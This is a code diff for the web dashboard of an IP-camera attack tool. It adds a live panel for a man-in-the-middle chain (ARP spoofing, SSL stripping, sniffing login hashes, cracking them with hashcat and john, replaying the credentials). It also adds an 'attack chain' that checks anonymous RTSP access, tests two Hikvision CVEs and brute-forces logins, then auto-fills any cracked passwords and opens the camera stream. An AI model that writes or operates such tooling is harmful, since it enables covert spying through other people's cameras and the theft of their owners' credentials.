@@ -95,7 +95,36 @@
                 </div>
             </div>
 
-            <!-- RTSP URLs -->
+            <!-- MITM Hash Intercept Status Panel -->
+            <div class="panel section-gap" id="intercept-panel" style="display:none">
+                <div class="panel-header">
+                    <div class="panel-title">🕵️ MITM Hash Intercept — Live Status</div>
+                    <button class="btn btn-sm btn-danger" onclick="stopIntercept()">⏹ Stop</button>
+                </div>
+                <div class="panel-body">
+                    <div id="intercept-stages" style="font-family:'Courier New',monospace;font-size:0.8rem;line-height:1.8">
+                        <div id="stage-mitm" style="color:var(--text-dim)">⬜ Layer 1: Passive sniff (no MITM)</div>
+                        <div id="stage-arp" style="color:var(--text-dim)">⬜ Layer 2: ARP spoof MITM</div>
+                        <div id="stage-ssl" style="color:var(--text-dim)">⬜ Layer 3: SSL strip (443→8080)</div>
+                        <div id="stage-sniff" style="color:var(--text-dim)">⬜ Layer 4: Active hash sniff</div>
+                        <div id="stage-crack" style="color:var(--text-dim)">⬜ Layer 5: Hash cracking (hashcat → john → offline MD5)</div>
+                        <div id="stage-result" style="color:var(--text-dim)">⬜ Layer 6: Credential replay verify</div>
+                    </div>
+                    <div id="intercept-log" style="margin-top:12px;background:var(--bg);padding:12px;border-radius:6px;font-family:'Courier New',monospace;font-size:0.75rem;max-height:200px;overflow-y:auto;color:var(--green)"></div>
+                    <div id="intercept-result" style="display:none;margin-top:14px;padding:14px;background:var(--bg);border:2px solid var(--green);border-radius:8px">
+                        <div style="color:var(--green);font-size:1rem;font-weight:700;margin-bottom:10px">✅ CAMERA ACCESS GAINED</div>
+                        <div style="display:grid;grid-template-columns:auto 1fr;gap:6px 16px;font-family:'Courier New',monospace;font-size:0.85rem">
+                            <span style="color:var(--text-dim)">Username:</span><span id="result-user" style="color:var(--cyan);font-weight:700"></span>
+                            <span style="color:var(--text-dim)">Password:</span><span id="result-pass" style="color:var(--yellow);font-weight:700"></span>
+                            <span style="color:var(--text-dim)">Stream:</span><span id="result-stream" style="color:var(--text-dim);font-size:0.72rem;word-break:break-all"></span>
+                        </div>
+                        <div style="margin-top:12px;display:flex;gap:8px">
+                            <button class="btn btn-sm btn-primary" id="btn-use-creds" onclick="useCrackedCreds()">▶ Use Credentials & Stream</button>
+                            <button class="btn btn-sm" onclick="copyToClipboard(document.getElementById('result-stream').textContent)">📋 Copy RTSP URL</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
             <div class="panel section-gap">
                 <div class="panel-header"><div class="panel-title">📡 RTSP Stream URLs</div></div>
                 <div class="panel-body" id="rtsp-urls">
@@ -439,7 +468,7 @@ function runVulnScan() {
 
 function runVulnScanIP(ip) {
     const el = document.getElementById("vuln-report");
-    if (el) el.innerHTML = '<div class="empty-state">Running CVE checks...</div>';
+    if (el) el.innerHTML = '<div class="empty-state">⏳ Running full camera attack (fingerprint → anon RTSP → CVEs → brute force)...</div>';
     if (!activeCam) selectCamera(ip, "");
 
     fetch(`/api/hikvision/${ip}`)
@@ -447,33 +476,87 @@ function runVulnScanIP(ip) {
         .then(data => {
             if (!el) return;
             const riskCls = data.risk_level === "CRITICAL" ? "critical" : data.risk_level === "HIGH" ? "high" : "medium";
-            el.innerHTML = `
-                <div style="margin-bottom:12px">
-                    <span class="risk-badge ${riskCls}">${data.risk_level}</span>
-                    ${data.firmware_date ? `<span style="margin-left:12px;font-size:0.78rem;color:var(--text-dim)">Firmware: ${data.firmware_date}</span>` : ""}
-                    ${data.realm ? `<span style="margin-left:12px;font-size:0.78rem;color:var(--text-dim)">Realm: ${data.realm}</span>` : ""}
-                </div>
-                ${data.summary.map(s => `<div class="finding-item ${riskCls}" style="margin-bottom:6px">${s}</div>`).join("")}
-                ${data.cve_2021_36260?.vulnerable
-                    ? '<div class="finding-item critical">CVE-2021-36260: Unauthenticated RCE VULNERABLE</div>'
-                    : '<div class="finding-item info">CVE-2021-36260: Patched ✓</div>'}
-                ${data.cve_2017_7921?.vulnerable
-                    ? `<div class="finding-item critical">CVE-2017-7921: Auth bypass VULNERABLE — ${data.cve_2017_7921.data?.slice(0,100)}</div>`
-                    : '<div class="finding-item info">CVE-2017-7921: Patched ✓</div>'}
-                ${data.credentials?.found
-                    ? `<div class="finding-item critical">🔑 Default creds: ${data.credentials.username}:${data.credentials.password}</div>`
-                    : ""}
-                ${data.device_info?.model ? `<div class="finding-item info">Model: ${data.device_info.model}</div>` : ""}
-                ${data.device_info?.firmwareVersion ? `<div class="finding-item info">Firmware: ${data.device_info.firmwareVersion}</div>` : ""}
-                ${data.device_info?.serialNumber ? `<div class="finding-item info">Serial: ${data.device_info.serialNumber}</div>` : ""}
-            `;
+            const brand = (data.brand || "generic").toUpperCase();
+
+            let html = `<div style="margin-bottom:12px;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+                <span class="risk-badge ${riskCls}">${data.risk_level}</span>
+                <span class="risk-badge low">${brand}</span>
+                ${data.firmware_date ? `<span style="font-size:0.78rem;color:var(--text-dim)">Firmware: ${data.firmware_date}</span>` : ""}
+                ${data.realm ? `<span style="font-size:0.78rem;color:var(--text-dim)">Realm: ${data.realm}</span>` : ""}
+                ${data.access_gained ? '<span class="risk-badge critical">✅ ACCESS GAINED</span>' : ''}
+            </div>`;
+
+            // Anonymous access
+            if (data.anonymous_rtsp) {
+                html += `<div class="finding-item critical" style="margin-bottom:6px">
+                    🔓 <strong>Anonymous RTSP (no password needed!)</strong><br>
+                    <code style="font-size:0.75rem">${data.anonymous_rtsp}</code>
+                    <div style="margin-top:6px">
+                        <button class="btn btn-sm btn-danger" onclick="streamAnon('${ip}','${data.anonymous_rtsp}')">▶ Stream Now (No Auth)</button>
+                    </div>
+                </div>`;
+            }
+            if (data.anonymous_snapshot) {
+                html += `<div class="finding-item critical" style="margin-bottom:6px">
+                    📸 <strong>Anonymous snapshot (no password needed!)</strong>
+                    — ${data.anonymous_snapshot.url}
+                    <div style="margin-top:6px">
+                        <img src="data:image/jpeg;base64,${data.anonymous_snapshot.b64}"
+                             style="max-width:300px;max-height:200px;border-radius:4px;cursor:pointer"
+                             onclick="this.requestFullscreen()">
+                    </div>
+                </div>`;
+            }
+            if (data.onvif && data.onvif.accessible) {
+                html += `<div class="finding-item high" style="margin-bottom:6px">
+                    📡 <strong>ONVIF accessible without authentication</strong> — ${data.onvif.endpoint}
+                </div>`;
+            }
+
+            // CVE results
+            if (data.cve_2021_36260?.vulnerable)
+                html += `<div class="finding-item critical" style="margin-bottom:6px">💀 CVE-2021-36260: Unauthenticated RCE CONFIRMED</div>`;
+            else
+                html += `<div class="finding-item info" style="margin-bottom:4px">CVE-2021-36260: Not vulnerable ✓</div>`;
+            if (data.cve_2017_7921?.vulnerable)
+                html += `<div class="finding-item critical" style="margin-bottom:6px">💀 CVE-2017-7921: Auth bypass CONFIRMED</div>`;
+            else
+                html += `<div class="finding-item info" style="margin-bottom:4px">CVE-2017-7921: Not vulnerable ✓</div>`;
+
+            // Summary findings
+            data.summary.forEach(s => {
+                html += `<div class="finding-item ${riskCls}" style="margin-bottom:4px">${s}</div>`;
+            });
+
+            // Device info
+            const di = data.device_info || {};
+            if (Object.keys(di).length) {
+                html += `<div style="margin-top:10px;padding:10px;background:var(--bg);border-radius:6px;font-size:0.78rem">`;
+                Object.entries(di).forEach(([k,v]) => { html += `<div><span style="color:var(--text-dim)">${k}:</span> ${v}</div>`; });
+                html += `</div>`;
+            }
+
+            el.innerHTML = html;
+
+            // Auto-fill credentials and start stream
             if (data.credentials?.found) {
                 document.getElementById("cam-user").value = data.credentials.username;
                 document.getElementById("cam-pass").value = data.credentials.password;
                 buildRTSPList(ip);
                 if (activeCam === ip) setTimeout(startStream, 500);
+            } else if (data.anonymous_rtsp) {
+                // Stream without credentials
+                streamAnon(ip, data.anonymous_rtsp);
             }
         });
+}
+
+function streamAnon(ip, rtspUrl) {
+    selectCamera(ip, "");
+    // Clear credentials for anonymous stream
+    document.getElementById("cam-user").value = "";
+    document.getElementById("cam-pass").value = "";
+    setTimeout(startStream, 300);
 }
 
 // ── Gallery ───────────────────────────────────────────────────────────────────
@@ -513,6 +596,117 @@ function copyToClipboard(text) {
 
 function openVLC(url) {
     window.open("vlc://" + url.replace("rtsp://", ""), "_blank");
+}
+
+// WebSocket: live MITM intercept status
+let _interceptIp = null;
+let _crackedCreds = null;
+
+socket.on("camera_intercept_status", data => {
+    if (!activeCam || data.ip !== activeCam) return;
+    const log = document.getElementById("intercept-log");
+    if (log) {
+        log.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${data.message}</div>`;
+        log.scrollTop = log.scrollHeight;
+    }
+    // Update stage indicators
+    const stageMap = {
+        mitm_starting: "stage-arp",
+        sniffing: "stage-sniff",
+        cracking: "stage-crack",
+        done: "stage-result",
+        error: "stage-result",
+    };
+    const stageId = stageMap[data.stage];
+    if (stageId) {
+        const el = document.getElementById(stageId);
+        if (el) {
+            el.style.color = data.stage === "error" ? "var(--red)" : "var(--yellow)";
+            el.textContent = el.textContent.replace("⬛", data.stage === "error" ? "❌" : "⏳");
+        }
+    }
+});
+
+socket.on("camera_cracked", data => {
+    if (data.ip !== (activeCam || data.ip)) return;
+    _crackedCreds = data;
+
+    // Mark all stages green
+    ["stage-mitm","stage-arp","stage-ssl","stage-sniff","stage-crack","stage-result"].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) { el.style.color = "var(--green)"; el.textContent = el.textContent.replace("⬛","✅").replace("⏳","✅"); }
+    });
+
+    // Show result box
+    document.getElementById("result-user").textContent = data.username;
+    document.getElementById("result-pass").textContent = data.password;
+    document.getElementById("result-stream").textContent = data.stream_url || `rtsp://${data.username}:${data.password}@${data.ip}:554/Streaming/Channels/101`;
+    document.getElementById("intercept-result").style.display = "block";
+
+    // Log to intercept log
+    const log = document.getElementById("intercept-log");
+    if (log) log.innerHTML += `<div style="color:var(--green);font-weight:700">[${new Date().toLocaleTimeString()}] ✅ CRACKED: ${data.username}:${data.password}</div>`;
+
+    // Also update status bar
+    const status = document.getElementById("creds-status");
+    if (status) {
+        status.textContent = `✓ Cracked: ${data.username}:${data.password}`;
+        status.style.color = "var(--green)";
+    }
+
+    // Auto-fill credential fields
+    document.getElementById("cam-user").value = data.username;
+    document.getElementById("cam-pass").value = data.password;
+});
+
+function useCrackedCreds() {
+    if (!_crackedCreds) return;
+    document.getElementById("cam-user").value = _crackedCreds.username;
+    document.getElementById("cam-pass").value = _crackedCreds.password;
+    buildRTSPList(activeCam);
+    setTimeout(startStream, 400);
+}
+
+function stopIntercept() {
+    document.getElementById("intercept-panel").style.display = "none";
+    _interceptIp = null;
+    // Stop the MITM spoof if running
+    if (activeCam) fetch("/api/spoof/stop/" + activeCam).catch(() => {});
+}
+
+// Override interceptCam to show status panel
+function interceptCam() {
+    if (!activeCam) return;
+    _interceptIp = activeCam;
+    _crackedCreds = null;
+
+    // Reset and show the intercept panel
+    ["stage-mitm","stage-arp","stage-ssl","stage-sniff","stage-crack","stage-result"].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) { el.style.color = "var(--text-dim)"; el.textContent = el.textContent.replace(/[✅⏳❌]/,"⬛"); }
+    });
+    document.getElementById("intercept-log").innerHTML = "";
+    document.getElementById("intercept-result").style.display = "none";
+    document.getElementById("intercept-panel").style.display = "block";
+    document.getElementById("intercept-panel").scrollIntoView({behavior:"smooth"});
+
+    // Mark Layer 1 as starting
+    const s1 = document.getElementById("stage-mitm");
+    if (s1) { s1.style.color = "var(--yellow)"; s1.textContent = s1.textContent.replace("⬛","⏳"); }
+
+    const status = document.getElementById("creds-status");
+    status.style.color = "var(--yellow)";
+    status.innerHTML = `⏳ MITM active — open <a href="http://${activeCam}" target="_blank" style="color:var(--cyan)">http://${activeCam}</a> and log in`;
+
+    fetch("/api/camera/intercept/" + activeCam)
+        .then(r => r.json())
+        .then(data => {
+            const log = document.getElementById("intercept-log");
+            if (log) log.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${data.message}</div>`;
+            // Update stage 1 → running
+            const s2 = document.getElementById("stage-arp");
+            if (s2) { s2.style.color = "var(--yellow)"; s2.textContent = s2.textContent.replace("⬛","⏳"); }
+        });
 }
 
 // WebSocket: auto-fill creds if brute force finds them via background scan
@@ -578,35 +772,42 @@ function startMITM(ip) {
     const mitmStatus = document.getElementById("mitm-status-" + ip);
     if (mitmStatus) { mitmStatus.textContent = "⏳ MITM active — open http://" + ip + " on any device and log in..."; mitmStatus.style.color = "var(--yellow)"; }
 
-    fetch("/api/camera/intercept/" + ip)
-        .then(r => r.json())
-        .then(() => {
-            if (mitmStatus) {
-                mitmStatus.innerHTML = `⏳ Interceptor running — <strong style="color:var(--cyan)">open <a href="http://${ip}" target="_blank" style="color:var(--cyan)">http://${ip}</a> on any device and log in</strong>. Watch Activity Log for cracked password.`;
-            }
-        });
+    // Select camera so intercept panel is visible
+    selectCamera(ip, "");
+    setTimeout(() => interceptCam(), 400);
 }
 
 function cardCVE(ip) {
     const result = document.getElementById("card-result-" + ip);
     const status = document.getElementById("card-status-" + ip);
-    if (status) { status.textContent = "Running CVE checks..."; status.style.color = "var(--yellow)"; }
-    if (result) { result.style.display = "block"; result.innerHTML = "⏳ Running CVE-2021-36260, CVE-2017-7921, brute force..."; }
+    if (status) { status.textContent = "Running full attack chain..."; status.style.color = "var(--yellow)"; }
+    if (result) { result.style.display = "block"; result.innerHTML = "⏳ Fingerprinting → Anon RTSP → CVEs → Brute force..."; }
 
     fetch("/api/hikvision/" + ip)
         .then(r => r.json())
         .then(data => {
-            if (status) { status.textContent = "CVE scan done: " + data.risk_level; status.style.color = data.risk_level === "CRITICAL" ? "var(--critical)" : data.risk_level === "HIGH" ? "var(--red)" : "var(--green)"; }
+            const brand = (data.brand||"generic").toUpperCase();
+            const cls = data.risk_level === "CRITICAL" ? "critical" : data.risk_level === "HIGH" ? "high" : "medium";
+            if (status) {
+                status.innerHTML = `<span class="risk-badge ${cls}">${data.risk_level}</span> <span class="risk-badge low">${brand}</span>${data.access_gained?' <span class="risk-badge critical">✅ ACCESS</span>':''}`;
+            }
             if (result) {
-                const cls = data.risk_level === "CRITICAL" ? "critical" : data.risk_level === "HIGH" ? "high" : "medium";
-                result.style.display = "block";
-                result.innerHTML = data.summary.map(s => `<div class="finding-item ${cls}" style="margin-bottom:4px">${s}</div>`).join("") ||
-                    `<div class="finding-item info">No critical findings</div>`;
-                if (data.credentials?.found) {
-                    result.innerHTML += `<div style="margin-top:8px">
-                        <button class="btn btn-sm btn-danger" onclick="quickStreamWithCreds('${ip}','${data.credentials.username}','${data.credentials.password}')">▶ Stream with found creds</button>
+                let html = data.summary.map(s => `<div class="finding-item ${cls}" style="margin-bottom:4px">${s}</div>`).join("") || `<div class="finding-item info">No exploits found</div>`;
+                if (data.anonymous_rtsp) {
+                    html += `<div style="margin-top:8px">
+                        <button class="btn btn-sm btn-danger" onclick="quickStream('${ip}')">▶ Stream (No Auth)</button>
+                    </div>`;
+                } else if (data.credentials?.found) {
+                    html += `<div style="margin-top:8px">
+                        <button class="btn btn-sm btn-danger" onclick="quickStreamWithCreds('${ip}','${data.credentials.username}','${data.credentials.password}')">▶ Stream with creds</button>
+                    </div>`;
+                } else {
+                    html += `<div style="margin-top:8px">
+                        <button class="btn btn-sm" style="border-color:var(--yellow);color:var(--yellow)" onclick="startMITM('${ip}')">🕵️ MITM Intercept</button>
                     </div>`;
                 }
+                result.style.display = "block";
+                result.innerHTML = html;
             }
         });
 }
